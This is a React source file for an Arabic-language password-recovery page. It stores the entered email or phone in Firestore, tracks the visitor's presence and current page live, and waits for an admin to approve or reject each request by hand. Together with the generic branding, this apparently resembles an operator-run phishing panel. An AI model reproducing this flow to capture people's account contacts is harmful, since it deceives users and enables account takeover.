import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Headphones, User, Phone, Mail, Loader2 } from 'lucide-react';
import { collection, addDoc, Timestamp, query, where, onSnapshot, doc } from 'firebase/firestore';
import { db } from '@/lib/firebase-config';
import { getClientId } from '@/lib/clientId';
import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';

const Logo = () => (
  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
  </svg>
);

const PowerLogo = () => (
  <svg viewBox="0 0 100 100" fill="none" stroke="#6c7a9c" strokeWidth="8" className="w-[30px] h-[30px]">
    <polygon points="50,10 90,30 90,70 50,90 10,70 10,30"/>
  </svg>
);

export default function ForgotPasswordPage() {
  const navigate = useNavigate();
  const [contact, setContact] = useState('');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<'idle' | 'waiting' | 'approved' | 'rejected'>('idle');
  const [error, setError] = useState('');
  const [inputIcon, setInputIcon] = useState<'user' | 'phone' | 'mail'>('user');

  useEffect(() => {
    const clientId = getClientId();
    setUserOnline(clientId, '/forgot-password');
    return () => setUserOffline(clientId);
  }, []);

  const handleInput = (val: string) => {
    // Prevent Arabic characters
    const cleanVal = val.replace(/[\u0600-\u06FF]/g, '');
    setContact(cleanVal);
    setError('');

    if (/^[0-9+]/.test(cleanVal)) {
      setInputIcon('phone');
    } else if (cleanVal.includes('@')) {
      setInputIcon('mail');
    } else {
      setInputIcon('user');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!contact.trim()) return;

    setLoading(true);
    setError('');

    try {
      const clientId = getClientId();
      const now = Timestamp.now();

      // Create password reset request in Firestore
      const docRef = await addDoc(collection(db!, 'passwordResets'), {
        contact: contact.trim().toLowerCase(),
        clientId: clientId,
        status: 'pending',
        createdAt: now,
        updatedAt: now
      });

      setStatus('waiting');
      updateUserPage(clientId, '/forgot-password-waiting');

      // Listen for admin decision
      const unsubscribe = onSnapshot(doc(db!, 'passwordResets', docRef.id), (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          if (data.status === 'approved') {
            setStatus('approved');
            unsubscribe();
            setTimeout(() => navigate('/reset-password'), 1500);
          } else if (data.status === 'rejected') {
            setStatus('idle');
            setLoading(false);
            setError('البريد الالكتروني غير مسجل');
            unsubscribe();
          }
        }
      });

    } catch (err) {
      console.error('Reset request error:', err);
      setError('حدث خطأ أثناء إرسال الطلب');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
      <div className="top-bar w-full flex justify-between items-center text-[#8d99ae] text-sm px-2">
        <span>الإنكليزية</span>
        <Headphones className="w-5 h-5 cursor-pointer" />
      </div>

      <div className="content-wrapper w-full max-w-[380px] mx-auto flex flex-col items-center my-auto">
        <div className="logo mb-6">
          <Logo />
        </div>

        <h1 className="text-2xl font-bold mb-2 w-full text-right text-white">استعادة الحساب</h1>
        <p className="text-[13px] text-[#8d99ae] w-full text-right mb-6 leading-relaxed">
          أدخل البريد الإلكتروني أو رقم الهاتف المرتبط بحسابك ليصلك رمز التحقق.
        </p>

        {status === 'waiting' ? (
          <div className="flex flex-col items-center w-full py-8">
            <div className="w-16 h-16 border-4 border-[#1e2942] border-t-[#4c72b8] rounded-full animate-spin mb-6"></div>
            <p className="text-white font-bold mb-2">جاري التحقق...</p>
            <p className="text-[#8d99ae] text-sm">يرجى الانتظار لحين معالجة طلبك</p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="w-full">
            <div className="relative w-full mb-5">
              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]">
                {inputIcon === 'phone' ? <Phone className="w-5 h-5" /> : 
                 inputIcon === 'mail' ? <Mail className="w-5 h-5" /> : 
                 <User className="w-5 h-5" />}
              </div>
              <input
                type="text"
                value={contact}
                onChange={(e) => handleInput(e.target.value)}
                placeholder="البريد الإلكتروني أو رقم الهاتف"
                className="w-full py-3.5 pr-12 pl-4 bg-[#1e2942] border border-[#2a3859] rounded-xl text-white text-sm outline-none focus:border-[#4c72b8] transition-colors"
                dir="ltr"
              />
            </div>

            <button
              type="submit"
              disabled={loading || !contact}
              className="w-full py-3.5 bg-[#4c72b8] hover:bg-[#3b5a93] disabled:bg-[#3b4d75] text-white font-bold rounded-xl transition-all flex items-center justify-center gap-2 mb-5"
            >
              {loading ? (
                <>
                  انتظر
                  <span className="flex gap-1">
                    <span className="animate-pulse">.</span>
                    <span className="animate-pulse delay-150">.</span>
                    <span className="animate-pulse delay-300">.</span>
                  </span>
                </>
              ) : 'إرسال رمز التحقق'}
            </button>

            {error && (
              <div className="text-red-400 text-sm text-center mb-5 animate-in fade-in duration-300">
                {error}
              </div>
            )}

            <div className="back-link text-center text-[13px] text-[#8d99ae]">
              تذكرت كلمة المرور؟ <span onClick={() => navigate('/login')} className="text-[#4a7c59] font-bold cursor-pointer hover:underline">تسجيل الدخول</span>
            </div>
          </form>
        )}
      </div>

      <div className="footer flex flex-col items-center text-[#6c7a9c] text-xs gap-1 pb-2">
        <span>POWERED BY</span>
        <PowerLogo />
        <span>احدث اصدار</span>
      </div>
    </div>
  );
}
